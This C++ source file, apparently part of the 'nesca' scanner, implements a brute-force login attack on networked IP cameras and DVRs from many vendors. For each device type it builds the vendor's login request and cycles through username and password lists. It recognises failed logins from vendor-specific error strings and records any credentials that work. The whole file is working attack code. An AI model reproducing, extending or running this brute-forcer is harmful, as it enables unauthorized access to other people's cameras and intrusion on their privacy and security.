#include "IPCAuth.h"
#include "Utils.h"
#include "BruteUtils.h"
#include "FileUpdater.h"

lopaStr IPC::IPCBrute(const char *ip, int port, char *SPEC)
{
    lopaStr lps = {"UNKNOWN", "", ""};
    bool result = true;
    char login[128] = {0};
    char pass[128] = {0};
    char request[1024] = {0};
    int passCounter = 1;
	int rowIndex = -1;

    std::vector<char*> negVector;
    if(strcmp(SPEC, "IPC") == 0)
    {
        negVector.push_back("<UserGroup>Invalid</UserGroup>");
    }
    else if(strcmp(SPEC, "GEO") == 0)
    {
        negVector.push_back("Access denied");
        negVector.push_back("ErrNoSuchUsr.htm");
    }
    else if(strcmp(SPEC, "EasyCam") == 0)
    {
        negVector.push_back("Set-Cookie: usrLevel=-1;path=/");
    }
    else if(strcmp(SPEC, "Foscam") == 0)
    {
        negVector.push_back("<result>0</result>");
        negVector.push_back("<result>-1</result>");
        negVector.push_back("<result>-2</result>");
        negVector.push_back("<result>-3</result>");
        negVector.push_back("<result>-4</result>");
        negVector.push_back("<result>-5</result>");
        negVector.push_back("<result>-6</result>");
        negVector.push_back("<result>-7</result>");
    }
    else if(strcmp(SPEC, "AVIOSYS") == 0)
    {
        negVector.push_back("Password Error");
    }
    else if(strcmp(SPEC, "BUFFALO") == 0)
    {
        negVector.push_back("403 Forbidden");
    }
    else if(strcmp(SPEC, "DVS") == 0)
    {
        negVector.push_back("Non-Existed");
    }
    else if(strcmp(SPEC, "IPCAM") == 0)
    {
        negVector.push_back("var check=\"0\"");
        negVector.push_back("var authLevel =\"0\";");
	}
	else if (strcmp(SPEC, "IEORFOREFOX") == 0)
	{
		negVector.push_back("AAA()");
		negVector.push_back("РРјСЏ РёР»Рё РїР°СЂРѕР»СЊ РЅРµРІРµСЂРЅС‹Рµ!");
		negVector.push_back("Р’РѕР·РІСЂР°С‚");
		negVector.push_back("HTTP/1.0 302 Found");
		negVector.push_back("is incorrect");
	}
	else if (strcmp(SPEC, "MASPRO") == 0)
	{
		negVector.push_back("action=\"setup_login.cgi\"");
	}
	else if (strcmp(SPEC, "WEBCAMXP") == 0)
	{
		negVector.push_back("Not logged in");
	}
	else if (strcmp(SPEC, "JASSUN") == 0)
	{
		negVector.push_back("Log in failed");
	}
	else if (strcmp(SPEC, "BEWARD") == 0)
	{
		negVector.push_back("/error.asp");
	}
	else if (strcmp(SPEC, "JUAN") == 0)
	{
		negVector.push_back("errno=\"4\"");
	}
    else
    {
        stt->doEmitionRedFoundData("[_IPCameraBrute] No \"SPEC\" specified!");
        return lps;
    };
	
	int res = 0;
    for(int i = 0; i < MaxLogin; ++i)
    {
        if(!globalScanFlag) break;
        if(strcmp(loginLst[i], " ") == 0) continue;
        //ZeroMemory(login, sizeof(login));
		login[0] = 0;
        strcpy(login, loginLst[i]);

        for(int j = 0; j < MaxPass; ++j)
        {
            FileUpdater::cv.wait(FileUpdater::lk, []{return FileUpdater::ready;});
            if(!globalScanFlag) break;
            if(strcmp(passLst[j], " ") == 0) continue;

            //ZeroMemory(pass, sizeof(pass));
			pass[0] = 0;
            strcpy(pass, passLst[j]);

            //ZeroMemory(request, sizeof(request));
			request[0] = 0;
            if(strcmp(SPEC, "IPC") == 0)
            {
                sprintf(request, "%s:%d/login.xml?user=%s&usr=%s&password=%s&pwd=%s",
                        ip, port, login, login, pass, pass);
            }
            else if(strcmp(SPEC, "GEO") == 0)
            {
                sprintf(request, "%s:%d/Login.cgi?username=%s&password=%s",
                        ip, port, login, pass);
            }
            else if(strcmp(SPEC, "EasyCam") == 0)
            {
                sprintf(request, "%s:%d/login.xml?user=%s&usr=%s&password=%s&pwd=%s",
                        ip, port, login, login, pass, pass);
            }
            else if(strcmp(SPEC, "Foscam") == 0)
            {
                sprintf(request, "%s:%d/cgi-bin/CGIProxy.fcgi?usr=%s&pwd=%s&cmd=logIn&usrName=%s&pwd=%s",
                        ip, port, login, pass, login, pass);
            }
            else if(strcmp(SPEC, "AVIOSYS") == 0)
            {
                sprintf(request, "%s:%d/check_user.html?UserName=%s&PassWord=%s",
                        ip, port, login, pass);
            }
            else if(strcmp(SPEC, "IPCAM") == 0)
            {
                sprintf(request, "%s:%d/cgi-bin/hi3510/checkuser.cgi?&-name=%s&-passwd=%s&-time=1416767330831",
                        ip, port, login, pass);
            }
            else if(strcmp(SPEC, "IEORFOREFOX") == 0)
            {
                doPost = true;
                sprintf(request, "%s:%d/logincheck.rsp?type=1", ip, port);
                sprintf(postData, "username=%s&userpwd=%s", login, pass);
            }
            else if(strcmp(SPEC, "BUFFALO") == 0)
            {
                doPost = true;
                sprintf(request, "%s:%d/rpc/login", ip, port);
                sprintf(postData, "user=%s&password=%s", login, pass);
			}
			else if (strcmp(SPEC, "DVS") == 0)
			{
				doPost = true;
				sprintf(request, "%s:%d/login", ip, port);
				sprintf(postData, "langs=en&user=%s&password=%s&submit=+Login+", login, pass);
			}
			else if (strcmp(SPEC, "MASPRO") == 0)
			{
				doPost = true;
				sprintf(request, "%s:%d/setup_login.cgi", ip, port);
				sprintf(postData, "check_username=%s&check_password=%s&login=", login, pass);
			}
			else if (strcmp(SPEC, "WEBCAMXP") == 0)
			{
				doPost = true;
				sprintf(request, "%s:%d/login.html", ip, port);
				sprintf(postData, "username=%s&password=%s&Redir=/", login, pass);
			}
			else if (strcmp(SPEC, "JASSUN") == 0)
			{
				doPost = true;
				sprintf(request, "%s:%d/Login.htm", ip, port);
				sprintf(postData, "command=login&username=%s&password=%s", login, pass);
			}
			else if (strcmp(SPEC, "BEWARD") == 0)
			{
				sprintf(request, "%s:%d/webs/httplogin?username=%s&password=%s&UserID=45637757",
					ip, port, login, pass);
			}
			else if (strcmp(SPEC, "JUAN") == 0)
			{
				//sprintf(request, "%s:%d/cgi-bin/gw.cgi?xml=<juan ver=\"\" squ=\"\" dir=\"\"><envload type=\"0\" usr=\"%s\" pwd=\"%s\"/></juan>&_=1450923182693",
				sprintf(request, "%s:%d/cgi-bin/gw.cgi?xml=%%3Cjuan%%20ver=%%22%%22%%20squ=%%22%%22%%20dir=%%22%%22%%3E%%3Cenvload%%20type=%%220%%22%%20usr=%%22%s%%22%%20pwd=%%22%s%%22/%%3E%%3C/juan%%3E&_=1450923182693",
					ip, port, login, pass);
			}
			
            std::string buffer;
			Connector con;
			if (doPost) res = con.nConnect(request, port, &buffer, postData);
			else res = con.nConnect(request, port, &buffer);

			if (res == -2) {
				if (rowIndex == -1) {
					nesca_3::addBARow(QString(ip) + ":" + QString::number(port), "--", "FAIL");
				}
				else {
					stt->doEmitionChangeBARow(rowIndex, "--", "FAIL");
				}
				return lps;
			}
			else if (res != -1) {
				for (int i = 0; i < negVector.size(); ++i)
				{
					if (Utils::ustrstr(buffer, negVector[i]) != -1)
					{
						result = false;
						break;
					};
				};

				if (result)
				{
					strcpy(lps.login, loginLst[i]);
					strcpy(lps.pass, passLst[j]);

					if (rowIndex == -1) {
						nesca_3::addBARow(QString(ip) + ":" + QString::number(port), QString(login) + ":" + QString(pass), "OK");
					}
					else {
						stt->doEmitionChangeBARow(rowIndex, QString(login) + ":" + QString(pass), "OK");
					}

					return lps;
				};
			}
			
			if (BALogSwitched) {
				if (rowIndex == -1) {
					rowIndex = nesca_3::addBARow(QString(ip) + ":" + QString::number(port),
						QString(login) + ":" + QString(pass),
						QString::number((passCounter / (double)(MaxPass*MaxLogin)) * 100).mid(0, 4) + "%");
				}
				else {
					stt->doEmitionChangeBARow(rowIndex, QString(login) + ":" + QString(pass),
						QString::number((passCounter / (double)(MaxPass*MaxLogin)) * 100).mid(0, 4) + "%");
				}
			}
			else { rowIndex = -1; }
			++passCounter;
            Sleep(100);
        };
    };
	if (rowIndex == -1) {
		nesca_3::addBARow(QString(ip) + ":" + QString::number(port), "--", "FAIL");
	}
	else {
		stt->doEmitionChangeBARow(rowIndex, "--", "FAIL");
	}
    return lps;
}

lopaStr IPC::IPCLobby(const char *ip, int port, char *SPEC) {
    if(gMaxBrutingThreads > 0) {
        while(BrutingThrds >= gMaxBrutingThreads) Sleep(1000);

		++baCount;
		++BrutingThrds;
		stt->doEmitionUpdateArc(gTargets);
		lopaStr lps = IPCBrute(ip, port, SPEC);
		--BrutingThrds;

        return lps;
    } else {
        lopaStr lps = {"UNKNOWN", "", ""};
        return lps;
    }
}
